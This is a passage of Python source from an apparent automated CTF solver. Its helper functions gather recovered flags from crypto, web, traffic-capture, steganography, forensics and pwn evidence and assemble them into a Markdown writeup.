    return steps[:8]


def _tool_observation_items(findings: list[Finding], observations: list[Observation]) -> list[dict[str, str]]:
    items: list[dict[str, str]] = []
    for finding in findings[-5:]:
        items.append({"label": finding.solver, "value": finding.finding})
    for observation in observations[-5:]:
        items.append({"label": f"{observation.source} / {observation.kind}", "value": observation.summary})
    return _dedupe_steps(items, ("label", "value"))[:8]


def _short_text(value: Any) -> str:
    text = str(value)
    return text if len(text) <= 360 else text[:357] + "..."


def _first_nested(steps: list[dict[str, Any]], key: str) -> dict[str, Any]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        value = evidence.get(key)
        if isinstance(value, dict):
            return value
    return {}


def _first_classical_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, Any]:
    for key in ("single_byte_xor", "repeating_key_xor", "vigenere"):
        for step in steps:
            evidence = step.get("evidence")
            if not isinstance(evidence, dict):
                continue
            value = evidence.get(key)
            if not isinstance(value, dict):
                continue
            flags = " ".join(_string_list(value.get("flags")))
            preview = str(value.get("plaintext_preview") or "")
            if not accepted_flag or accepted_flag in flags or accepted_flag in preview:
                return value
    return {}


def _first_followed_url(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> str:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        urls = _string_list(evidence.get("followed_urls"))
        if not urls:
            continue
        samples = evidence.get("samples")
        if not accepted_flag or accepted_flag in str(samples) or accepted_flag in str(evidence.get("flag_candidates")):
            return urls[0]
    return ""


def _first_web_response_flag(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        if step.get("solver") != "WebSolver":
            continue
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        target = str(evidence.get("target") or "")
        flags = _string_list(evidence.get("flag_candidates"))
        sample = str(evidence.get("response_sample") or "")
        headers = evidence.get("response_headers")
        header_text = ""
        header_names: list[str] = []
        if isinstance(headers, dict):
            for name, value in headers.items():
                line = f"{name}: {value}"
                header_text += line + "\n"
                if accepted_flag and accepted_flag in line:
                    header_names.append(str(name))
        if accepted_flag and accepted_flag not in flags and accepted_flag not in sample and accepted_flag not in header_text:
            continue
        flag = accepted_flag or (flags[0] if flags else _first_flag_like(sample or header_text))
        if not flag:
            continue
        source = "响应头" if flag in header_text and flag not in sample else "响应正文"
        cookie_names = _string_list(evidence.get("set_cookie_names"))
        important_headers = [*header_names, *cookie_names]
        return {
            "target": target,
            "flag": flag,
            "source": source,
            "headers": ", ".join(dict.fromkeys(item for item in important_headers if item)),
        }
    return {}


def _first_traffic_pcap_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        artifact = evidence.get("artifact")
        artifact_name = artifact.get("name") if isinstance(artifact, dict) else None
        streams = evidence.get("tcp_stream_payloads")
        if isinstance(streams, list):
            for stream in streams:
                if not isinstance(stream, dict):
                    continue
                flags = _string_list(stream.get("flags"))
                sample = str(stream.get("sample") or "")
                if accepted_flag and accepted_flag not in flags and accepted_flag not in sample:
                    continue
                flag = accepted_flag or (flags[0] if flags else "")
                return {
                    "artifact_name": str(artifact_name or ""),
                    "stream_id": str(stream.get("stream_id") or "0"),
                    "flag": flag,
                    "export_name": _first_http_export_name(evidence, accepted_flag=accepted_flag),
                }
        exports = evidence.get("http_object_exports")
        if isinstance(exports, list):
            for export in exports:
                if not isinstance(export, dict):
                    continue
                flags = _string_list(export.get("flags"))
                preview = str(export.get("text_preview") or "")
                if accepted_flag and accepted_flag not in flags and accepted_flag not in preview:
                    continue
                return {
                    "artifact_name": str(artifact_name or ""),
                    "stream_id": "0",
                    "flag": accepted_flag or (flags[0] if flags else preview),
                    "export_name": str(export.get("name") or ""),
                }
    return {}


def _first_antsword_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        recovery = evidence.get("antsword_recovery")
        if not isinstance(recovery, dict):
            continue
        flags = _string_list(recovery.get("flag_candidates"))
        reconstructed = str(recovery.get("reconstructed_text") or "")
        if accepted_flag and accepted_flag not in flags and accepted_flag not in reconstructed:
            continue
        return {
            "artifact_name": _evidence_artifact_name(evidence),
            "method": str(recovery.get("method") or ""),
            "command_object": str(recovery.get("command_object") or ""),
            "output_object": str(recovery.get("output_object") or ""),
            "flag": accepted_flag or (flags[0] if flags else _first_flag_like(reconstructed)),
        }
    return {}


def _first_dns_exfil_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        dns_summary = evidence.get("dns_summary")
        if not isinstance(dns_summary, dict):
            continue
        hints = _string_list(dns_summary.get("decoded_query_hints"))
        queries = dns_summary.get("query_names")
        query = ""
        if isinstance(queries, list) and queries:
            first = queries[0]
            if isinstance(first, dict):
                query = str(first.get("name") or "")
            else:
                query = str(first)
        if accepted_flag and accepted_flag not in hints:
            continue
        artifact = evidence.get("artifact")
        artifact_name = artifact.get("name") if isinstance(artifact, dict) else ""
        return {
            "artifact_name": str(artifact_name or ""),
            "query": query,
            "flag": accepted_flag or (hints[0] if hints else ""),
        }
    return {}


def _first_forensics_strings_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        if step.get("solver") != "ForensicsSolver":
            continue
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        flags = _string_list(evidence.get("flag_candidates"))
        decoded = evidence.get("decoded_transform_candidates")
        if isinstance(decoded, list):
            for candidate in decoded:
                if isinstance(candidate, dict) and isinstance(candidate.get("value"), str):
                    flags.append(candidate["value"])
        tool_samples = evidence.get("tool_samples")
        strings_stdout = ""
        file_stdout = ""
        if isinstance(tool_samples, dict):
            strings_sample = tool_samples.get("strings")
            if isinstance(strings_sample, dict):
                strings_stdout = str(strings_sample.get("stdout") or "")
            file_sample = tool_samples.get("file")
            if isinstance(file_sample, dict):
                file_stdout = str(file_sample.get("stdout") or "").strip()
        if accepted_flag and accepted_flag not in flags and accepted_flag not in strings_stdout:
            continue
        artifact = evidence.get("artifact")
        artifact_name = artifact.get("name") if isinstance(artifact, dict) else ""
        return {
            "artifact_name": str(artifact_name or ""),
            "file_output": file_stdout,
            "flag": accepted_flag or (flags[0] if flags else ""),
        }
    return {}


def _first_pwn_tcp_banner(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        if step.get("solver") != "PwnSolver":
            continue
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        target = str(evidence.get("target") or "")
        transcript = str(evidence.get("transcript") or "")
        flags = _string_list(evidence.get("flag_candidates"))
        if not target or (accepted_flag and accepted_flag not in flags and accepted_flag not in transcript):
            continue
        return {
            "target": target,
            "transcript": transcript.strip(),
            "flag": accepted_flag or (flags[0] if flags else ""),
        }
    return {}


def _first_http_export_name(evidence: dict[str, Any], accepted_flag: str | None = None) -> str:
    exports = evidence.get("http_object_exports")
    if not isinstance(exports, list):
        return ""
    for export in exports:
        if not isinstance(export, dict):
            continue
        flags = _string_list(export.get("flags"))
        preview = str(export.get("text_preview") or "")
        if accepted_flag and accepted_flag not in flags and accepted_flag not in preview:
            continue
        return str(export.get("name") or "")
    return ""


def _first_transform_candidate(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, Any]:
    fallback: dict[str, Any] = {}
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        candidates = evidence.get("transform_candidates")
        if not isinstance(candidates, list):
            continue
        for candidate in candidates:
            if isinstance(candidate, dict):
                if accepted_flag and accepted_flag in str(candidate.get("value") or candidate):
                    return candidate
                if not fallback:
                    fallback = candidate
            if isinstance(candidate, str):
                normalized = {"value": candidate}
                if accepted_flag and accepted_flag in candidate:
                    return normalized
                if not fallback:
                    fallback = normalized
    return fallback


def _first_image_idat_payload(steps: list[dict[str, Any]]) -> dict[str, Any]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        image_stego = evidence.get("image_stego")
        if not isinstance(image_stego, dict):
            continue
        for payload in image_stego.get("idat_payloads", []):
            if isinstance(payload, dict):
                return payload
    return {}


def _first_image_lsb_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, Any]:
    fallback: dict[str, Any] = {}
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        image_stego = evidence.get("image_stego")
        if not isinstance(image_stego, dict):
            continue
        artifact_name = _evidence_artifact_name(evidence)
        flags = _string_list(evidence.get("flag_candidates"))
        for candidate in image_stego.get("lsb_candidates", []):
            if not isinstance(candidate, dict):
                continue
            candidate_flags = _string_list(candidate.get("flag_like_strings"))
            text = str(candidate.get("text_preview") or "")
            flag = accepted_flag or (candidate_flags[0] if candidate_flags else (flags[0] if flags else _first_flag_like(text)))
            recovery = {
                "artifact_name": artifact_name,
                "recipe": str(candidate.get("recipe") or ""),
                "bit_plane": candidate.get("bit_plane"),
                "channel_order": str(candidate.get("channel_order") or ""),
                "bit_order": str(candidate.get("bit_order") or ""),
                "coordinate_order": str(candidate.get("coordinate_order") or "xy"),
                "decoders": candidate.get("decoders"),
                "text_preview": text,
                "flag": flag,
            }
            if accepted_flag and (accepted_flag in candidate_flags or accepted_flag in flags or accepted_flag in text):
                return recovery
            if candidate_flags and not fallback:
                fallback = recovery
            elif not fallback:
                fallback = recovery
    return fallback


def _first_archive_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        archive = evidence.get("archive")
        previews = evidence.get("archive_text_previews")
        if not isinstance(archive, dict) or not isinstance(previews, list):
            continue
        artifact_name = _evidence_artifact_name(evidence)
        kind = str(archive.get("kind") or "")
        for preview in previews:
            if not isinstance(preview, dict):
                continue
            text = str(preview.get("text_preview") or "")
            flags = _string_list(evidence.get("flag_candidates"))
            if accepted_flag and accepted_flag not in text and accepted_flag not in flags:
                continue
            return {
                "artifact_name": artifact_name,
                "entry_name": str(preview.get("name") or _first_string(archive.get("interesting_entries")) or ""),
                "flag": accepted_flag or (flags[0] if flags else _first_flag_like(text)),
                "kind": kind,
            }
    return {}


def _first_image_text_chunk_recovery(steps: list[dict[str, Any]], accepted_flag: str | None = None) -> dict[str, str]:
    for step in steps:
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        image_stego = evidence.get("image_stego")
        if not isinstance(image_stego, dict):
            continue
        text_chunks = image_stego.get("text_chunks")
        if not isinstance(text_chunks, list):
            continue
        artifact_name = _evidence_artifact_name(evidence)
        flags = _string_list(evidence.get("flag_candidates"))
        for chunk in text_chunks:
            if not isinstance(chunk, dict):
                continue
            preview = str(chunk.get("text_preview") or "")
            if accepted_flag and accepted_flag not in preview and accepted_flag not in flags:
                continue
            return {
                "artifact_name": artifact_name,
                "chunk_type": str(chunk.get("type") or "text"),
                "keyword": str(chunk.get("keyword") or "text"),
                "flag": accepted_flag or (flags[0] if flags else _first_flag_like(preview)),
            }
    return {}


def _first_reverse_strings_step(steps: list[dict[str, Any]]) -> dict[str, Any]:
    for step in steps:
        if step.get("solver") not in {"ReverseSolver", "PwnSolver"}:
            continue
        evidence = step.get("evidence")
        if not isinstance(evidence, dict):
            continue
        strings = _reverse_strings_evidence(evidence)
        if strings:
            return strings
    return {}


def _reverse_strings_evidence(evidence: dict[str, Any]) -> dict[str, Any]:
    tool_samples = evidence.get("tool_samples")
    if not isinstance(tool_samples, dict):
        return {}
    strings_extract = tool_samples.get("strings_extract")
    if not isinstance(strings_extract, dict):
        return {}
    strings_stdout = str(strings_extract.get("stdout") or "").strip()
    flags = _string_list(evidence.get("flag_candidates"))
    if not strings_stdout or not flags:
        return {}
    artifact = evidence.get("artifact")
    artifact_path = str(artifact) if artifact else ""
    artifact_name = _basename(artifact_path) if artifact_path else None
    file_identify = tool_samples.get("file_identify")
    file_stdout = ""
    if isinstance(file_identify, dict):
        file_stdout = _normalize_file_output(file_identify.get("stdout"), artifact_name)
    return {
        "artifact_name": artifact_name,
        "file_stdout": file_stdout,
        "flags": flags,
        "strings_stdout": _short_command_output(strings_stdout),
    }


def _normalize_file_output(value: object, artifact_name: str | None) -> str:
    text = _short_command_output(value)
    if ":" not in text:
        return text
    prefix, suffix = text.split(":", 1)
    if artifact_name and prefix.endswith(artifact_name):
        return suffix.strip()
    return text


def _short_command_output(value: object, limit: int = 180) -> str:
    text = " ".join(str(value or "").split())
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _image_stego_evidence_items(image_stego: dict[str, Any]) -> list[dict[str, str]]:
    lsb_candidates = image_stego.get("lsb_candidates")
    if isinstance(lsb_candidates, list) and lsb_candidates:
        first = next((candidate for candidate in lsb_candidates if isinstance(candidate, dict)), None)
        if first:
            return [
                {
                    "label": "PNG LSB",
                    "value": str(first.get("recipe") or "low-bit-plane"),
                },
                {
                    "label": "提取文本",
                    "value": str(first.get("text_preview") or _first_string(first.get("flag_like_strings")) or ""),
                },
            ]
    payloads = image_stego.get("idat_payloads")
    if isinstance(payloads, list) and payloads:
        first = next((payload for payload in payloads if isinstance(payload, dict)), None)
        if first:
            return [
                {
                    "label": "额外 IDAT",
                    "value": (
                        f"chunk_index={first.get('chunk_index')}, "
                        f"decompressed_size={first.get('decompressed_size')}, "
                        f"truncated={bool(first.get('truncated_chunk'))}"
                    ),
                },
                {
                    "label": "解压文本",
                    "value": str(first.get("text_preview") or _first_string(first.get("flag_like_strings")) or ""),
                },
            ]
    return []


def _recipe_text(value: object) -> str | None:
    if not isinstance(value, list) or not value:
        return None
    return " -> ".join(str(item) for item in value)


def _transform_reproduction_step(method: object) -> str:
    if not method:
        return "直接从题面文本或附件明文中按 flag 格式筛选候选结果。"
    return f"对可疑文本执行 {method} 转换，并按 flag 格式筛选候选结果。"


def _first_string(value: object) -> str | None:
    values = _string_list(value)
    return values[0] if values else None


def _basename(path: str) -> str:
    return path.rstrip("/").rsplit("/", 1)[-1] or path


def _safe_filename_slug(value: str) -> str:
    slug = "".join(char.lower() if char.isalnum() else "_" for char in value)
    slug = "_".join(part for part in slug.split("_") if part)
    return slug or "pwn"


def _evidence_artifact_name(evidence: dict[str, Any]) -> str:
    artifact = evidence.get("artifact")
    if isinstance(artifact, dict):
        return str(artifact.get("name") or _basename(str(artifact.get("path") or "")) or "")
    if isinstance(artifact, str):
        return _basename(artifact)
    return ""


def _first_flag_like(text: str) -> str:
    start = text.find("flag{")
    if start < 0:
        return ""
    end = text.find("}", start)
    return text[start : end + 1] if end >= start else ""


def _string_list(value: object) -> list[str]:
    if not isinstance(value, list):
        return []
    return [item for item in value if isinstance(item, str)]


def _markdown_writeup(
    title: str,
    sections: list[dict[str, Any]],
    exploit_script: dict[str, str] | None = None,
) -> str:
    lines = [f"# {title}", ""]
    for section in sections:
        lines.extend([f"## {section['title']}", "", str(section.get("body") or ""), ""])
        if section.get("steps"):
            for index, step in enumerate(section["steps"], 1):
                lines.append(f"{index}. {step}")
            lines.append("")
    if exploit_script:
        language = exploit_script.get("language") or "text"
        filename = exploit_script.get("filename") or "exploit.py"
        content = exploit_script.get("content") or ""
        lines.extend(["### Exploit 脚本", "", f"`{filename}`", "", f"```{language}", content.rstrip(), "```", ""])
    return "\n".join(lines).strip() + "\n"
